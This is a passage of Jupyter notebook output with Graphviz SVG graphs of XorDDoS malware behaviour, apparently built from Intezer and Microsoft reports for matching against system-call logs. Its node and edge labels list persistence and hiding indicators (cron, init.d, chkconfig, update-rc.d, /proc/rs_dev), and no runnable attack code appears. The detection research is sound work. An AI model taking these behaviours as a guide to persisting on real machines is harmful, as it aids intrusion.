font-size=\"14.00\">56.lseek</text>\n</g>\n<!-- Start&#45;&gt;18 -->\n<g id=\"edge59\" class=\"edge\">\n<title>Start&#45;&gt;18</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.34,-263.7C2906.96,-262.34 4041.02,-255.53 4066.96,-229 4102.5,-192.64 4008.8,-182.72 3953.38,-180.01\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3953.33,-176.51 3943.19,-179.57 3953.03,-183.5 3953.33,-176.51\"/>\n<text text-anchor=\"middle\" x=\"4097.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">51.open</text>\n</g>\n<!-- 19 -->\n<g id=\"node20\" class=\"node\">\n<title>19</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4176.96\" cy=\"-18\" rx=\"31.7\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4176.96\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^sed$</text>\n</g>\n<!-- Start&#45;&gt;19 -->\n<g id=\"edge60\" class=\"edge\">\n<title>Start&#45;&gt;19</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.1,-263.58C2913.29,-261.71 4094.81,-253.13 4124.96,-229 4180.07,-184.89 4182.29,-92.37 4179.57,-46.29\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4183.05,-45.88 4178.85,-36.15 4176.07,-46.37 4183.05,-45.88\"/>\n<text text-anchor=\"middle\" x=\"4197.46\" y=\"-130.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">38.exec</text>\n</g>\n<!-- 20 -->\n<g id=\"node21\" class=\"node\">\n<title>20</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4290.96\" cy=\"-178\" rx=\"71.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4290.96\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">[a&#45;zA&#45;z]:d{1,5}$</text>\n</g>\n<!-- Start&#45;&gt;20 -->\n<g id=\"edge61\" class=\"edge\">\n<title>Start&#45;&gt;20</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.15,-263.56C2915.22,-261.6 4111.22,-252.69 4187.96,-229 4199.62,-225.4 4200.22,-219.8 4210.96,-214 4221.69,-208.2 4233.58,-202.59 4244.84,-197.62\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4246.32,-200.8 4254.11,-193.61 4243.54,-194.37 4246.32,-200.8\"/>\n<text text-anchor=\"middle\" x=\"4239.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">12.shmget</text>\n</g>\n<!-- Start&#45;&gt;20 -->\n<g id=\"edge62\" class=\"edge\">\n<title>Start&#45;&gt;20</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.33,-263.58C2931.27,-261.62 4233.72,-252.5 4268.96,-229 4276.87,-223.72 4281.96,-214.91 4285.22,-206.14\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4288.61,-207.03 4288.18,-196.45 4281.91,-204.99 4288.61,-207.03\"/>\n<text text-anchor=\"middle\" x=\"4308.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">41.umask</text>\n</g>\n<!-- Start&#45;&gt;20 -->\n<g id=\"edge63\" class=\"edge\">\n<title>Start&#45;&gt;20</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.28,-263.98C2940.3,-263.69 4308.99,-260.57 4339.96,-229 4349.22,-219.55 4341.75,-209.1 4330.09,-200.2\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4331.73,-197.09 4321.51,-194.32 4327.78,-202.86 4331.73,-197.09\"/>\n<text text-anchor=\"middle\" x=\"4380.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">2.exit_group</text>\n</g>\n<!-- 21 -->\n<g id=\"node22\" class=\"node\">\n<title>21</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4461.96\" cy=\"-178\" rx=\"57.69\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4461.96\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/rs_dev</text>\n</g>\n<!-- Start&#45;&gt;21 -->\n<g id=\"edge64\" class=\"edge\">\n<title>Start&#45;&gt;21</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.28,-263.45C2948.49,-260.82 4378.18,-248.94 4419.96,-229 4431.08,-223.69 4440.33,-213.87 4447.29,-204.33\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4450.36,-206.04 4453.03,-195.79 4444.55,-202.14 4450.36,-206.04\"/>\n<text text-anchor=\"middle\" x=\"4461.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">20.open</text>\n</g>\n<!-- 22 -->\n<g id=\"node23\" class=\"node\">\n<title>22</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4636.96\" cy=\"-178\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4636.96\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;22 -->\n<g id=\"edge65\" class=\"edge\">\n<title>Start&#45;&gt;22</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.44,-264.07C2938.89,-264.21 4300.79,-262.6 4488.96,-229 4508.88,-225.44 4512.8,-220.53 4531.96,-214 4552.86,-206.87 4576.17,-199.08 4595.5,-192.67\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4596.82,-195.92 4605.21,-189.45 4594.62,-189.28 4596.82,-195.92\"/>\n<text text-anchor=\"middle\" x=\"4554.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">52.open</text>\n</g>\n<!-- Start&#45;&gt;22 -->\n<g id=\"edge66\" class=\"edge\">\n<title>Start&#45;&gt;22</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.22,-264.14C2960.36,-264.61 4483.74,-264.46 4577.96,-229 4585.97,-225.98 4600.64,-213.56 4613.35,-201.86\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4616.03,-204.15 4620.93,-194.75 4611.24,-199.04 4616.03,-204.15\"/>\n<text text-anchor=\"middle\" x=\"4625.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">50.stat64</text>\n</g>\n<!-- Start&#45;&gt;22 -->\n<g id=\"edge67\" class=\"edge\">\n<title>Start&#45;&gt;22</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.53,-264.2C2976.35,-265.01 4615.23,-266.34 4651.96,-229 4658.4,-222.45 4657.39,-213.25 4653.82,-204.53\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4656.82,-202.72 4649.17,-195.39 4650.59,-205.89 4656.82,-202.72\"/>\n<text text-anchor=\"middle\" x=\"4679.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">60.write</text>\n</g>\n<!-- Start&#45;&gt;22 -->\n<g id=\"edge68\" class=\"edge\">\n<title>Start&#45;&gt;22</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.25,-264.23C2981.4,-265.22 4668.22,-267.35 4705.96,-229 4719.76,-214.98 4700.59,-202.03 4678.99,-192.82\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4680.26,-189.56 4669.68,-189.12 4677.67,-196.07 4680.26,-189.56\"/>\n<text text-anchor=\"middle\" x=\"4733.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">57.lseek</text>\n</g>\n<!-- 23 -->\n<g id=\"node24\" class=\"node\">\n<title>23</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4771.96\" cy=\"-91\" rx=\"50.09\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4771.96\" y=\"-87.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">bin/openrc</text>\n</g>\n<!-- Start&#45;&gt;23 -->\n<g id=\"edge69\" class=\"edge\">\n<title>Start&#45;&gt;23</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.52,-264.21C2987.89,-265.07 4720.66,-266.78 4760.96,-229 4790.36,-201.44 4785.75,-150.61 4779.21,-119.21\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4782.6,-118.34 4776.97,-109.37 4775.78,-119.9 4782.6,-118.34\"/>\n<text text-anchor=\"middle\" x=\"4803.46\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">31.stat</text>\n</g>\n<!-- 24 -->\n<g id=\"node25\" class=\"node\">\n<title>24</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4849.96\" cy=\"-18\" rx=\"37.09\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4849.96\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">bin/sed</text>\n</g>\n<!-- Start&#45;&gt;24 -->\n<g id=\"edge70\" class=\"edge\">\n<title>Start&#45;&gt;24</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.31,-264.12C2982.08,-264.56 4675.45,-264.45 4780.96,-229 4804.47,-221.1 4813.28,-217.32 4825.96,-196 4853.82,-149.14 4854.73,-83.16 4852.57,-46.43\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4856.03,-45.74 4851.83,-36.02 4849.05,-46.24 4856.03,-45.74\"/>\n<text text-anchor=\"middle\" x=\"4868.46\" y=\"-130.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">37.stat</text>\n</g>\n<!-- 25 -->\n<g id=\"node26\" class=\"node\">\n<title>25</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4917.96\" cy=\"-178\" rx=\"38.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4917.96\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/selinux</text>\n</g>\n<!-- Start&#45;&gt;25 -->\n<g id=\"edge71\" class=\"edge\">\n<title>Start&#45;&gt;25</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.14,-263.56C2995.75,-261.18 4804.83,-249.31 4858.96,-229 4867.02,-225.97 4881.83,-213.41 4894.6,-201.64\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4897.31,-203.9 4902.2,-194.5 4892.51,-198.79 4897.31,-203.9\"/>\n<text text-anchor=\"middle\" x=\"4908.46\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">40.access</text>\n</g>\n<!-- Start&#45;&gt;25 -->\n<g id=\"edge72\" class=\"edge\">\n<title>Start&#45;&gt;25</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.25,-263.61C3007.87,-261.46 4915.93,-250.34 4936.96,-229 4943.7,-222.15 4941.89,-212.67 4937.33,-203.8\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4940.3,-201.94 4932.08,-195.26 4934.34,-205.61 4940.3,-201.94\"/>\n<text text-anchor=\"middle\" x=\"4964.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">39.statfs</text>\n</g>\n<!-- 26 -->\n<g id=\"node27\" class=\"node\">\n<title>26</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"5029.96\" cy=\"-178\" rx=\"52.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"5029.96\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">update&#45;rc.d</text>\n</g>\n<!-- Start&#45;&gt;26 -->\n<g id=\"edge73\" class=\"edge\">\n<title>Start&#45;&gt;26</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2597.21,-263.84C3009.95,-262.9 4938.38,-256.99 4992.96,-229 5003.15,-223.77 5011.25,-214.29 5017.24,-204.98\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"5020.32,-206.65 5022.34,-196.24 5014.27,-203.12 5020.32,-206.65\"/>\n<text text-anchor=\"middle\" x=\"5032.96\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">28.clone</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.sources.Source at 0x2501fa9c640>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Intezer.csv raw doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"588pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 588.14 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 584.14,-127 584.14,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"83\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"83\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"39\" cy=\"-18\" rx=\"38.99\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"39\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">ip_addr</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M57.52,-87.73C51.39,-82.52 45.58,-76.2 42,-69 38.53,-62.04 37.12,-53.85 36.75,-46.13\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"40.25,-46.08 36.8,-36.06 33.25,-46.04 40.25,-46.08\"/>\n<text text-anchor=\"middle\" x=\"74\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">5.hardcode</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"128\" cy=\"-18\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"128\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M95.05,-86.91C98.76,-81.32 102.73,-75 106,-69 110.07,-61.5 114,-53.1 117.38,-45.35\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"120.67,-46.57 121.34,-36 114.22,-43.84 120.67,-46.57\"/>\n<text text-anchor=\"middle\" x=\"137.5\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">6.extract</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"225\" cy=\"-105\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"225\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">GID($|.|$)</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"324\" cy=\"-105\" rx=\"33.6\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"324\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/rc</text>\n</g>\n<!-- 5 -->\n<g id=\"node6\" class=\"node\">\n<title>5</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"423\" cy=\"-105\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"423\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/init.d/</text>\n</g>\n<!-- 6 -->\n<g id=\"node7\" class=\"node\">\n<title>6</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"534\" cy=\"-105\" rx=\"46.29\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"534\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">UID($|.|$)</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x2501fa9c670>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Intezer.csv matched doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"163pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 162.69 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 158.69,-127 158.69,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-18\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M77.34,-86.8C77.34,-75.16 77.34,-59.55 77.34,-46.24\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"80.84,-46.18 77.34,-36.18 73.84,-46.18 80.84,-46.18\"/>\n<text text-anchor=\"middle\" x=\"101.84\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">6.extract</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x2501fa9c6a0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "matched ASG OPset for doc Xorddos-Intezer.csv\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"163pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 162.69 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 158.69,-127 158.69,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-18\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M53.43,-87.54C47.75,-82.33 42.44,-76.06 39.34,-69 34.59,-58.16 40.71,-47.52 49.33,-38.86\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"51.8,-41.34 56.97,-32.09 47.16,-36.1 51.8,-41.34\"/>\n<text text-anchor=\"middle\" x=\"66.84\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.readlink</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M87.44,-87.13C90.25,-81.55 92.92,-75.19 94.34,-69 96.19,-60.96 94.64,-52.39 91.85,-44.66\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"95.03,-43.19 87.82,-35.42 88.61,-45.99 95.03,-43.19\"/>\n<text text-anchor=\"middle\" x=\"117.34\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">19.open</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x2501fa9c670>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Ms.csv raw doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"2932pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 2931.57 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 2927.57,-127 2927.57,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1430.57\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1430.57\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"69.57\" cy=\"-18\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"69.57\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1353.31,-103.55C1059.69,-101.66 28.29,-93.32 4.57,-69 -8.22,-55.89 8.25,-43.33 27.81,-34.08\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"29.48,-37.17 37.23,-29.95 26.66,-30.76 29.48,-37.17\"/>\n<text text-anchor=\"middle\" x=\"26.07\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">21.pass</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1353.03,-103.44C1067.97,-101.2 93.31,-91.87 70.57,-69 64.65,-63.05 63.06,-54.46 63.37,-46.07\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"66.85,-46.48 64.53,-36.14 59.89,-45.67 66.85,-46.48\"/>\n<text text-anchor=\"middle\" x=\"93.07\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">49.drop</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge35\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1352.96,-104.15C1093.83,-104.33 268.26,-102.25 153.57,-69 133.07,-63.06 112.45,-50.9 96.77,-40.05\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"98.76,-37.18 88.59,-34.21 94.7,-42.87 98.76,-37.18\"/>\n<text text-anchor=\"middle\" x=\"178.57\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">22.delete</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"272.57\" cy=\"-18\" rx=\"55.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"272.57\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^chkconfig$</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1353.43,-103.22C1088.58,-100.36 231.52,-89.53 211.57,-69 200.37,-57.48 212.24,-46.02 228.39,-36.99\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"230.37,-39.9 237.68,-32.23 227.18,-33.67 230.37,-39.9\"/>\n<text text-anchor=\"middle\" x=\"231.07\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">25.add</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge11\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1353.4,-103.08C1097.6,-99.86 292.58,-88.21 273.57,-69 267.73,-63.1 266.11,-54.63 266.37,-46.34\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"269.88,-46.46 267.54,-36.13 262.93,-45.66 269.88,-46.46\"/>\n<text text-anchor=\"middle\" x=\"305.07\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">33.perform</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge20\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1353.26,-103.31C1125.73,-101.02 468.51,-92.43 374.57,-69 361.31,-65.69 332.5,-51.31 308.88,-38.81\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"310.26,-35.59 299.79,-33.97 306.97,-41.76 310.26,-35.59\"/>\n<text text-anchor=\"middle\" x=\"399.07\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">27.install</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"463.57\" cy=\"-18\" rx=\"57.69\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"463.57\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/rs_dev</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge10\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1352.98,-104.19C1123.74,-104.36 463.42,-101.99 431.57,-69 424.04,-61.2 428.1,-51.37 435.49,-42.49\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"438.26,-44.66 442.65,-35.01 433.21,-39.82 438.26,-44.66\"/>\n<text text-anchor=\"middle\" x=\"453.07\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">17.have</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge33\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1353.2,-104.27C1146.06,-104.53 589.39,-102.12 513.57,-69 501.09,-63.55 490.03,-53.43 481.51,-43.72\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"484.03,-41.27 474.98,-35.76 478.62,-45.71 484.03,-41.27\"/>\n<text text-anchor=\"middle\" x=\"532.07\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">36.use</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"824.57\" cy=\"-18\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"824.57\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" 